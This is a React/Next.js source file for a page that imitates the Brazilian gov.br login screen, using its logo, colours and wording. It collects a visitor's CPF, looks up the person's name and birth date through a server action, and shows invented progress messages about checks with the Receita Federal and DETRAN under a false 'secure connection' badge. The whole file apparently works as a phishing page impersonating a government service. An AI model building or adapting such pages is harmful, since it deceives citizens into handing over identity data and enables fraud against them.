"use client"

import type React from "react"

import { useState, useEffect } from "react"
import Image from "next/image"
import { cpfMask, validateCPF } from "@/utils/validators"
import { consultarCPF } from "@/app/actions"
import { motion, AnimatePresence } from "framer-motion"

interface LoginPageProps {
  onSubmit: (cpf: string, nome: string, dataNascimento: string) => void
}

export function LoginPage({ onSubmit }: LoginPageProps) {
  const [cpf, setCpf] = useState("")
  const [error, setError] = useState("")
  const [loading, setLoading] = useState(false)
  const [loadingStep, setLoadingStep] = useState(0)

  const loadingSteps = [
    { icon: "🔐", text: "Autenticando no sistema gov.br...", color: "from-blue-500 to-blue-600" },
    { icon: "🔍", text: "Verificando CPF na Receita Federal...", color: "from-indigo-500 to-indigo-600" },
    { icon: "📋", text: "Consultando base de dados nacional...", color: "from-purple-500 to-purple-600" },
    { icon: "🏛️", text: "Acessando sistema DETRAN...", color: "from-violet-500 to-violet-600" },
    { icon: "✅", text: "Validando informações cadastrais...", color: "from-green-500 to-green-600" },
  ]

  useEffect(() => {
    if (loading) {
      const interval = setInterval(() => {
        setLoadingStep((prev) => (prev + 1) % loadingSteps.length)
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [loading, loadingSteps.length])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    const cpfClean = cpf.replace(/\D/g, "")

    if (!cpfClean) {
      setError("CPF é obrigatório")
      return
    }

    if (!validateCPF(cpfClean)) {
      setError("CPF inválido")
      return
    }

    setLoading(true)
    setLoadingStep(0)

    try {
      const resultado = await consultarCPF(cpfClean)

      if (resultado.success) {
        setError("")
        onSubmit(cpfClean, resultado.data.nome, resultado.data.dataNascimento)
      } else {
        setLoading(false)
        setError(resultado.error || "Erro ao consultar CPF")
      }
    } catch (err) {
      setLoading(false)
      setError("Erro ao processar a solicitação. Tente novamente.")
      console.error("Erro ao consultar CPF:", err)
    }
  }

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    setCpf(cpfMask(value))

    if (error) setError("")
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-[#f8f8f8] relative">
      <motion.div
        className={`w-full max-w-[360px] bg-white shadow-md rounded-sm overflow-hidden ${loading ? "blur-sm" : ""}`}
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
      >
        <div className="p-6 pb-4 flex justify-center border-b border-[#DFDFDF]">
          <Image src="/images/govbr-logo.webp" alt="gov.br" width={100} height={40} className="h-8 w-auto" />
        </div>

        <div className="px-6 pb-6">
          <motion.h1
            className="text-[#1B1B1B] text-lg font-medium mt-6 mb-5"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.2, duration: 0.5 }}
          >
            Identifique-se no gov.br com:
          </motion.h1>

          <motion.div
            className="flex items-center mb-4"
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.3, duration: 0.5 }}
          >
            <div className="bg-[#1351B4] p-1 rounded-sm mr-2">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="text-white"
              >
                <rect x="3" y="4" width="18" height="16" rx="2" />
                <path d="M16 2v4" />
                <path d="M8 2v4" />
                <path d="M3 10h18" />
                <path d="M8 14h.01" />
                <path d="M12 14h.01" />
                <path d="M16 14h.01" />
                <path d="M8 18h.01" />
                <path d="M12 18h.01" />
                <path d="M16 18h.01" />
              </svg>
            </div>
            <span className="text-[#1351B4] font-medium">Número do CPF</span>
          </motion.div>

          <motion.p
            className="text-sm text-[#606060] mb-5"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.4, duration: 0.5 }}
          >
            Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
          </motion.p>

          <motion.form
            onSubmit={handleSubmit}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.5, duration: 0.5 }}
          >
            <div className="mb-5">
              <label htmlFor="cpf" className="block text-sm font-medium text-[#1B1B1B] mb-1">
                CPF
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-5 w-5 text-gray-400"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2"
                    />
                  </svg>
                </div>
                <input
                  type="text"
                  id="cpf"
                  value={cpf}
                  onChange={handleCpfChange}
                  placeholder="Digite seu CPF"
                  className={`w-full pl-10 p-3 border ${
                    error ? "border-red-500" : "border-[#DDDDDD]"
                  } rounded-sm focus:outline-none focus:ring-1 focus:ring-[#1351B4] text-[#1B1B1B]`}
                  disabled={loading}
                />
              </div>
              {error && <p className="mt-1 text-sm text-red-600">{error}</p>}
            </div>

            <button
              type="submit"
              disabled={loading}
              className={`w-full bg-[#1351B4] text-white py-3 px-6 rounded-sm hover:bg-[#0D47A1] focus:outline-none focus:ring-2 focus:ring-[#1351B4] focus:ring-offset-2 transition-colors font-medium ${
                loading ? "opacity-70 cursor-not-allowed" : ""
              }`}
            >
              Continuar
            </button>
          </motion.form>

          <motion.div
            className="mt-8 pt-6 border-t border-[#DDDDDD]"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.6, duration: 0.5 }}
          >
            <h2 className="text-sm text-[#1B1B1B] mb-4">Outras opções de identificação:</h2>

            <div className="space-y-4">
              <div className="flex items-center">
                <div className="bg-[#1351B4] p-1 rounded-sm mr-2">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path
                      d="M6.5 10H4.5V17H6.5V10ZM12.5 10H10.5V17H12.5V10ZM21 18H2V20H21V18ZM18.5 10H16.5V17H18.5V10ZM11.5 3.26L16.71 6H6.29L11.5 3.26ZM11.5 1L2 6V8H21V6L11.5 1Z"
                      fill="white"
                    />
                  </svg>
                </div>
                <span className="text-[#1351B4] font-medium">Login com seu banco</span>
                <span className="ml-2 text-xs bg-[#1351B4] text-white px-2 py-1 rounded-sm">SUA CONTA SERÁ PRATA</span>
              </div>

              <div className="flex items-center">
                <div className="bg-[#1351B4] p-1 rounded-sm mr-2">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path
                      d="M9.5 6.5V9.5H3.5V6.5H9.5ZM11 5H2V11H11V5ZM9.5 14.5V17.5H3.5V14.5H9.5ZM11 13H2V19H11V13ZM17.5 6.5V9.5H11.5V6.5H17.5ZM19 5H10V11H19V5ZM17.5 14.5V17.5H11.5V14.5H17.5ZM19 13H10V19H19V13Z"
                      fill="white"
                    />
                  </svg>
                </div>
                <span className="text-[#1351B4] font-medium">Login com QR code</span>
              </div>

              <div className="flex items-center">
                <div className="bg-[#1351B4] p-1 rounded-sm mr-2">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path
                      d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM12 11.99H19C18.47 16.11 15.72 19.78 12 20.93V12H5V6.3L12 3.19V11.99Z"
                      fill="white"
                    />
                  </svg>
                </div>
                <span className="text-[#1351B4] font-medium">Seu certificado digital</span>
              </div>

              <div className="flex items-center">
                <div className="bg-[#1351B4] p-1 rounded-sm mr-2">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path
                      d="M19.35 10.04C18.67 6.59 15.64 4 12 4C9.11 4 6.6 5.64 5.35 8.04C2.34 8.36 0 10.91 0 14C0 17.31 2.69 20 6 20H19C21.76 20 24 17.76 24 15C24 12.36 21.95 10.22 19.35 10.04ZM19 18H6C3.79 18 2 16.21 2 14C2 11.95 3.53 10.24 5.56 10.03L6.63 9.92L7.13 8.97C8.08 7.14 9.94 6 12 6C14.62 6 16.88 7.86 17.39 10.43L17.69 11.93L19.22 12.04C20.78 12.14 22 13.45 22 15C22 16.65 20.65 18 19 18ZM8 13H10.55V16H13.45V13H16L12 9L8 13Z"
                      fill="white"
                    />
                  </svg>
                </div>
                <span className="text-[#1351B4] font-medium">Seu certificado digital em nuvem</span>
              </div>
            </div>
          </motion.div>

          <motion.div
            className="mt-6 flex justify-center"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.7, duration: 0.5 }}
          >
            <div className="flex items-center text-[#1351B4]">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5 mr-2"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                />
              </svg>
              <span className="text-sm">Está com dúvidas e precisa de ajuda?</span>
            </div>
          </motion.div>

          <motion.div
            className="mt-4 text-center"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.8, duration: 0.5 }}
          >
            <a href="#" className="text-sm text-[#1351B4] hover:underline">
              Termo de Uso e Aviso de Privacidade
            </a>
          </motion.div>
        </div>
      </motion.div>

      <motion.div
        className="mt-4 text-xs text-gray-500"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.9, duration: 0.5 }}
      >
        <p>Versão do sistema: 1.5.2</p>
      </motion.div>

      <AnimatePresence>
        {loading && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50"
          >
            <motion.div
              className="bg-white rounded-lg shadow-2xl p-8 max-w-md w-full mx-4"
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
            >
              <div className="text-center">
                <motion.div
                  key={loadingStep}
                  initial={{ scale: 0, rotate: -180 }}
                  animate={{ scale: 1, rotate: 0 }}
                  transition={{ duration: 0.5 }}
                  className={`inline-flex items-center justify-center w-24 h-24 rounded-full bg-gradient-to-br ${loadingSteps[loadingStep].color} mb-6 shadow-lg`}
                >
                  <span className="text-5xl">{loadingSteps[loadingStep].icon}</span>
                </motion.div>

                <AnimatePresence mode="wait">
                  <motion.h2
                    key={loadingStep}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -20 }}
                    transition={{ duration: 0.3 }}
                    className="text-xl font-bold text-[#071D41] mb-4"
                  >
                    {loadingSteps[loadingStep].text}
                  </motion.h2>
                </AnimatePresence>

                <div className="w-full bg-gray-200 rounded-full h-3 mb-6 overflow-hidden">
                  <motion.div
                    className={`h-full bg-gradient-to-r ${loadingSteps[loadingStep].color} rounded-full`}
                    initial={{ width: "0%" }}
                    animate={{ width: `${((loadingStep + 1) / loadingSteps.length) * 100}%` }}
                    transition={{ duration: 0.5 }}
                  />
                </div>

                <div className="flex justify-center space-x-2 mb-4">
                  {[0, 1, 2].map((i) => (
                    <motion.div
                      key={i}
                      className="w-3 h-3 bg-[#1351B4] rounded-full"
                      animate={{
                        scale: [1, 1.5, 1],
                        opacity: [0.5, 1, 0.5],
                      }}
                      transition={{
                        duration: 1,
                        repeat: Number.POSITIVE_INFINITY,
                        delay: i * 0.2,
                      }}
                    />
                  ))}
                </div>

                <p className="text-sm text-[#555555] mb-4">Aguarde enquanto validamos suas informações...</p>

                <div className="mt-6 flex items-center justify-center text-xs text-[#4CAF50]">
                  <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                    />
                  </svg>
                  Conexão segura e criptografada
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}
